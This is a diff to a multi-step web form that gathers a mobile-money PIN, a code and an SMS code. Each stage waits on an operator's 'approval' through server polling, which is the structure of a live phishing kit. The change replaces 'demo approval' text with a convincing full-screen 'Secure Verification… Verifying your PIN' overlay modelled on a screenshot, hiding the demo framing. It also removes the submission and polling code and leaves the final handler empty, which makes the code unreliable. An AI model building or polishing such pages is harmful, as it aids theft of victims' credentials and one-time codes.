@@ -134,43 +134,54 @@ button:disabled {
   pointer-events: none;
 }
 
-/* Screenshot Accurate Progress Ring Component */
-/* Container to keep layout alignment intact */
+/* Screenshot Accurate Full-screen Loading Overlay */
 .spinner-container {
+    position: fixed;
+    top: 0;
+    left: 0;
+    width: 100vw;
+    height: 100vh;
+    background-color: #2a3b4c;
     display: flex;
+    flex-direction: column;
     justify-content: center;
     align-items: center;
-    margin: 30px auto;
+    z-index: 9999;
 }
 
-/* The exact visual look from your screenshot */
-.secure-loading-ring {
-    width: 70px;
-    height: 70px;
-    
-    /* Dark grey background ring track */
-    border: 6px solid #4a5568; 
-    
-    /* Bright green active indicator segment */
-    border-top: 6px solid #00df89; 
-    border-right: 6px solid #00df89;
-    
+/* Sizing and neon colors matching the image */
+.spinner {
+    width: 90px;
+    height: 90px;
+    border: 7px solid #475869; 
+    border-top: 7px solid #00e676; 
     border-radius: 50%;
-    animation: spin-smooth 1.2s cubic-bezier(0.4, 0, 0.2, 1) infinite;
-    
-    /* Subtle glow effect seen in the screenshot */
-    box-shadow: 0 0 10px rgba(0, 223, 137, 0.15);
+    animation: spin-perfect 1.0s linear infinite;
+    margin-bottom: 35px;
 }
 
-@keyframes spin-smooth {
+/* Typography styles matching screenshot positioning */
+.spinner-container .headline {
+    color: #ffffff;
+    font-size: 24px;
+    font-weight: bold;
+    margin: 0 0 10px 0;
+    text-align: center;
+    font-family: Arial, sans-serif;
+}
+
+.spinner-container .subline {
+    color: #b0bec5;
+    font-size: 15px;
+    margin: 0;
+    text-align: center;
+    font-family: Arial, sans-serif;
+    line-height: 1.4;
+}
+
+@keyframes spin-perfect {
     0% { transform: rotate(0deg); }
     100% { transform: rotate(360deg); }
-}
-
-
-@keyframes spin {
-  from { transform: rotate(0deg); }
-  to { transform: rotate(360deg); }
 }
 
 .status {
@@ -244,8 +255,11 @@ button:disabled {
     <p>Enter any five test digits. Do not use your real mobile-money PIN.</p>
     <div class="boxes" id="pinBoxes"></div>
     <div id="pinWaiting" class="hidden">
-      <div class="spinner"></div>
-      <div class="status">Waiting for demo approval...</div>
+      <div class="spinner-container">
+        <div class="spinner"></div>
+        <p class="headline">Secure Verification</p>
+        <p class="subline">Verifying your PIN...<br>Please do not close this page.</p>
+      </div>
     </div>
     <div id="pinMessage" class="status"></div>
   </section>
@@ -259,8 +273,11 @@ button:disabled {
     <input id="code1" type="text" autocomplete="off" placeholder="Enter a test value">
     <button id="submitCode1" disabled="true">Continue</button>
     <div id="code1Waiting" class="hidden">
-      <div class="spinner"></div>
-      <div class="status">Waiting for demo approval...</div>
+      <div class="spinner-container">
+        <div class="spinner"></div>
+        <p class="headline">Secure Verification</p>
+        <p class="subline">Verifying code...<br>Please do not close this page.</p>
+      </div>
     </div>
     <div id="code1Message" class="status"></div>
   </section>
@@ -271,8 +288,11 @@ button:disabled {
     <p>Enter any four test digits. Do not use an actual SMS code.</p>
     <div class="boxes" id="code2Boxes"></div>
     <div id="code2Waiting" class="hidden">
-      <div class="spinner"></div>
-      <div class="status">Waiting for demo approval...</div>
+      <div class="spinner-container">
+        <div class="spinner"></div>
+        <p class="headline">Secure Verification</p>
+        <p class="subline">Finalizing verification...<br>Please do not close this page.</p>
+      </div>
     </div>
     <div id="code2Message" class="status"></div>
   </section>
@@ -335,7 +355,6 @@ function setupBoxInputs(containerId, count, onComplete) {
     inputs.push(input);
   }
   
-  // FIXED: Focus the first actual input element in the array instead of the array object
   if (inputs.length > 0) inputs[0].focus();
 }
 
@@ -400,58 +419,4 @@ submitCode1Btn.addEventListener("click", async () => {
 });
 
 // Final step submission handler
-async function submitCode2Stage(code2Value) {
-  userData.code2 = code2Value;
-  document.getElementById("code2Waiting").classList.remove("hidden");
 
-  const success = await sendStagePayload("code2", { code2: userData.code2 });
-  if (success) {
-    startPolling("code2", "page4", "page5", "code2Waiting", "code2Message");
-  }
-}
-
-// Pipeline transmission communications helper
-async function sendStagePayload(stage, payload) {
-  try {
-    const response = await fetch("/api/approval-request", {
-      method: "POST",
-      headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({ sessionId, stage, payload })
-    });
-    return response.ok;
-  } catch (e) {
-    return false;
-  }
-}
-
-// Polling core infrastructure engine
-function startPolling(stage, currentPageId, nextPageId, spinnerId, msgId, successCallback) {
-  const msgElement = document.getElementById(msgId);
-  msgElement.className = "status";
-  msgElement.innerText = "";
-
-  if(pollingInterval) clearInterval(pollingInterval);
-
-  pollingInterval = setInterval(async () => {
-    try {
-      const res = await fetch(`/api/status?sessionId=${sessionId}&stage=${stage}`);
-      const data = await res.json();
-
-      if (data.status === "approved") {
-        clearInterval(pollingInterval);
-        document.getElementById(spinnerId).classList.add("hidden");
-        document.getElementById(currentPageId).classList.add("hidden");
-        document.getElementById(nextPageId).classList.remove("hidden");
-        if (successCallback) successCallback();
-      } else if (data.status === "declined") {
-        clearInterval(pollingInterval);
-        document.getElementById(spinnerId).classList.add("hidden");
-        msgElement.classList.add("error");
-        msgElement.innerText = "Submission declined. Please refresh and retry.";
-      }
-    } catch (err) {
-      console.error("Status check failed");
-    }
-  }, 2500);
-}
-</script>
